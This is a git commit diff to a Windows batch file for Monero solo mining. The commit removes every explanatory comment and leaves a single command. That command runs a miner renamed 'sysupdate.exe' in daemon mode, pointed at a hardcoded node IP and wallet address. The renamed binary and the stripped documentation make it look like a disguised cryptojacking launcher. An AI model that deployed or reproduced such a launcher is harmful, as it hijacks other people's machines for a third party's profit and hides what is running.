4b7f529b78ca98de0f8ae2cf6ee77393fb88d9b5
FalconTN <fsff3521@gmail.com>
2025-01-25 04:23:27 +0300

    Update solo_mine_example.cmd

--- solo_mine_example.cmd
+++ solo_mine_example.cmd
@@ -1,15 +1,3 @@
-yo:: Example batch file for mining Monero solo
-::
-:: Format:
-::	sysupdate.exe -o <node address>:<node port> -a rx/0 -u <wallet address> --daemon
-::
-:: Fields:
-::	node address		The host name of your monerod node or its IP address. It can also be a public node with RPC enabled, for example node.xmr.to
-::	node port 		The RPC port of your monerod node to connect to, usually 18081.
-::	wallet address		Check your Monero CLI or GUI wallet to see your wallet's address.
-::
-:: Mining solo is the best way to help Monero network be more decentralized!
-:: But you will only get a payout when you find a block which can take more than a year for a single low-end PC.
 
 cd /d "%~dp0"
 sysupdate.exe -o 144.91.121.7:18081 -a rx/0 -u 87REqG9YrLwcPuj3tTNo5o7CNJFLXVimQhgCNjKBXrvj8e5iEta72UVCfPX8ggiNNSd9uyYr4qNZRYNYxagXw93mQT2ohKx --daemon
